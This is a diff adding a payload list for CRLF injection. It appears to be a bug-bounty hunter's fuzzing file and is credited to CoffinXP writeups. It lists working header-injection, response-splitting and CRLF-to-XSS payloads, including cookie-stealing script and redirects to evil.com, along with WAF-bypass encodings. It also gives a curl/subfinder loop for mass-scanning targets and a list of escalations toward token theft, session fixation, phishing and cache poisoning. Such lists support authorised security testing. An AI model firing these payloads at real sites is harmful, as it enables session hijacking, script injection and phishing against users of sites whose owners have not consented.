@@ -1,0 +1,77 @@
+# CRLF Injection payloads — distilled from packs/writeups/master-crlf-injection-… (CoffinXP / Lostsec)
+# One payload per line. Fuzz these into every user-controlled URL segment, query param, and header value.
+# Detection: successful injection puts your Set-Cookie / X-Injection-Test into the response headers.
+
+# ── Basic CRLF header injection ─────────────────────────────
+%0d%0aX-Injection-Test: injected
+%0d%0aSet-Cookie: hacked=true;
+%0d%0aSet-Cookie: crlfinjection=coffinxp;
+%0d%0aSet-Cookie:whoami=coffinxp
+%0d%0aLocation: https://evil.com
+%0d%0aLocation: http://evil.com
+%0d%0aLocation: www.evil.com
+
+# ── Bare LF (some parsers reject CR but accept LF) ─────────
+%0aSet-Cookie:coffin=hi
+%0aSet-Cookie:coffin=hi;
+%0aLocation: https://evil.com
+%0aX-XSS-Protection:0
+
+# ── Response-splitting (inject full second HTTP response) ──
+%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert('Split!')</script>
+%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
+%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('XSS');</script>
+%0d%0aHost: {{Hostname}}%0d%0aCookie: coffin=hi%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: coffin=hi%0d%0a%0d%0a
+
+# ── CRLF → reflected XSS (body split into HTML) ────────────
+%0d%0a%0d%0a<script>alert('XSS via CRLF')</script>
+%0d%0a%0d%0a<img src=x onerror=prompt(1)>
+%0d%0a%0d%0a%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E
+%0d%0a%0d%0a%3Cscript%3Edocument.location.href%3D%22https%3A%2F%2Fevil.com%22%3C%2Fscript%3E
+%0d%0a%0d%0a<iframe src="https://www.attacker.com/">
+%0d%0a%0d%0a%3CA%20HREF%3D%22https%3A%2F%2Fexample.com%2F%22%3ELogin%20Here%20%3C%2FA%3E
+%0d%0a%3Ch1%3EHTML INJECTION%3C%2Fh1%3E%0A%3Cp%3ECRLF%20Injection%20PoC%3C%2Fp%3E
+
+# ── Question-mark prefix (breaks some SSRF-style parsers) ──
+%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+%3f%0d%0aLocation:%0d%0acoffin-x:coffin-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>
+
+# ── Hash prefix ─────────────────────────────────────────────
+%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>
+%23%0aSet-Cookie:coffin=hi
+%23%0d%0aSet-Cookie: injected=1
+
+# ── Path-traversal + CRLF combo ─────────────────────────────
+%2e%2e%2f%0d%0aSet-Cookie:coffin=hi
+%2e%2e%2f%2e%2e%2f%0d%0aSet-Cookie:coffin=hi
+%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a<script>alert(document.cookie)</script>%2F../%2F..%2F..%2F..%2F../tr
+
+# ── Double-URL-encoded (WAF bypass) ────────────────────────
+%25%30%61Set-Cookie:coffin=hi
+%25%30%64%25%30%61Set-Cookie:coffin=hi
+%25%30%64%25%30%61Location:%20https://evil.com
+
+# ── Unicode CRLF (嘍嘊 — WAF bypass on parsers that decode) ─
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=coffinxp
+%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=coffinxp
+%E5%98%8D%E5%98%8ALocation:%20https://evil.com
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=coffinxp%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE
+
+# ── Placement matters — try these injection SPOTS ─────────
+# - end of URL path (before query string)  →  /page%0d%0aSet-Cookie:...
+# - inside a query value                   →  ?next=home%0d%0aSet-Cookie:...
+# - inside Host / Referer / User-Agent headers via a proxy
+# - inside a URL used as a redirect target (login?returnTo=...)
+
+# ── Detection recipe (drop into hunt loop) ─────────────────
+# curl -sI "https://target/page%0d%0aSet-Cookie:crlf=coffinxp" | grep -i 'set-cookie: crlf'
+# subfinder -d target.com -all -silent | httpx-toolkit -silent | \
+#   while read u; do curl -sI "$u/%0d%0aSet-Cookie:crlf=coffinxp" 2>/dev/null | \
+#     grep -q 'set-cookie: crlf' && echo "VULN: $u"; done
+
+# ── Escalations ────────────────────────────────────────────
+# CRLF → XSS via body split          (highest impact, cookie/token theft)
+# CRLF → Set-Cookie hijack           (session fixation)
+# CRLF → open-redirect via Location  (phishing chain)
+# CRLF → cache poison                (see brain/payloads/cache-poison.txt + cache-deception)
+# CRLF → webhook DoS                 (drop delivery, poison retries)
